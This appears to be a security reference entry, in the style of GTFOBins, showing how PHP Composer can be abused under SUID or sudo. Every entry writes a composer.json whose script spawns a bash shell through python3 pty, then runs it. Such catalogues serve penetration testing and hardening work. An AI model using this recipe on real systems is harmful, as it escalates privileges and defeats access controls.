---
functions:
  suid:
    - code: |
        cat << EOF > composer.json
        {
            "scripts": {
                "command": "python3 -c 'import pty;pty.spawn(\"bash\")'"
            }
        }
        EOF
        ./composer run-script command
  sudo:
    - code: |
        cat << EOF > composer.json
        {
            "scripts": {
                "command": "python3 -c 'import pty;pty.spawn(\"bash\")'"
            }
        }
        EOF
        composer run-script command
---
